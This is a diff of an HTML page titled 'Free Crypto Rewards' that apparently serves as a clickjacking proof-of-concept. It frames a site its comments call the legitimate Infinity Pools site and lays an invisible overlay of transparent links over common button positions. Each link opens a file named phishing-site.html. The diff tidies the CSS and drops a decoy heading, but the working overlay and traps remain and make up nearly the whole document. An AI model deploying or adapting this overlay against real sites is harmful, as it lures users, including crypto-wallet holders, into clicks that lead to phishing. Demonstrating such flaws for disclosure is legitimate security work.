@@ -1,22 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Free Crypto Rewards</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
         }
-
         .demo-banner {
             background: #ff6b6b;
             color: white;
@@ -29,33 +23,11 @@
             right: 0;
             z-index: 99999;
         }
-
         .container {
             padding-top: 60px;
             max-width: 1400px;
             margin: 0 auto;
         }
-
-        .decoy-content {
-            background: white;
-            margin: 20px;
-            padding: 40px;
-            border-radius: 15px;
-            text-align: center;
-        }
-
-        .decoy-content h1 {
-            color: #333;
-            margin-bottom: 20px;
-            font-size: 36px;
-        }
-
-        .decoy-content p {
-            color: #666;
-            font-size: 18px;
-            margin-bottom: 30px;
-        }
-
         .iframe-container {
             position: relative;
             width: 100%;
@@ -65,7 +37,6 @@
             overflow: hidden;
             box-shadow: 0 10px 40px rgba(0,0,0,0.3);
         }
-
         #legitimateIframe {
             position: absolute;
             top: 0;
@@ -75,7 +46,6 @@
             border: none;
             opacity: 0.5;
         }
-
         .malicious-overlay {
             position: absolute;
             top: 0;
@@ -85,7 +55,6 @@
             pointer-events: none;
             z-index: 100;
         }
-
         .click-trap {
             position: absolute;
             pointer-events: auto;
@@ -93,64 +62,35 @@
             background: transparent;
             border: none;
         }
-
         .click-trap.visible {
             background: rgba(255, 0, 0, 0.3);
             border: 3px solid red;
         }
+        .click-trap:hover.visible { background: rgba(255, 0, 0, 0.5); }
 
-        .click-trap:hover.visible {
-            background: rgba(255, 0, 0, 0.5);
-        }
-
-        /* Position traps over common button locations */
         .trap-center {
-            top: 45%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            height: 60px;
+            top: 45%; left: 50%; transform: translate(-50%, -50%);
+            width: 300px; height: 60px;
         }
-
         .trap-top {
-            top: 20%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 250px;
-            height: 50px;
+            top: 20%; left: 50%; transform: translateX(-50%);
+            width: 250px; height: 50px;
         }
-
         .trap-bottom {
-            bottom: 20%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 250px;
-            height: 50px;
+            bottom: 20%; left: 50%; transform: translateX(-50%);
+            width: 250px; height: 50px;
         }
-
         .trap-left {
-            top: 50%;
-            left: 15%;
-            transform: translateY(-50%);
-            width: 200px;
-            height: 50px;
+            top: 50%; left: 15%; transform: translateY(-50%);
+            width: 200px; height: 50px;
         }
-
         .trap-right {
-            top: 50%;
-            right: 15%;
-            transform: translateY(-50%);
-            width: 200px;
-            height: 50px;
+            top: 50%; right: 15%; transform: translateY(-50%);
+            width: 200px; height: 50px;
         }
-
-        /* Large area trap to catch most clicks */
         .trap-wide {
-            top: 35%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80%;
-            height: 40%;
+            top: 35%; left: 50%; transform: translateX(-50%);
+            width: 80%; height: 40%;
         }
     </style>
 </head>
@@ -160,11 +100,6 @@
     </div>
 
     <div class="container">
-        <div class="decoy-content">
-            <h1>Free Crypto Rewards</h1>
-            <p>Connect your wallet and claim your rewards!</p>
-        </div>
-
         <div class="iframe-container">
             <!-- The legitimate Infinity Pools site -->
             <iframe 
@@ -175,7 +110,6 @@
 
             <!-- Invisible malicious overlay with click traps -->
             <div class="malicious-overlay" id="maliciousOverlay">
-                <!-- Multiple click traps positioned to catch button clicks -->
                 <a href="phishing-site.html" class="click-trap trap-center" id="trap1" target="_blank"></a>
                 <a href="phishing-site.html" class="click-trap trap-top" id="trap2" target="_blank"></a>
                 <a href="phishing-site.html" class="click-trap trap-bottom" id="trap3" target="_blank"></a>
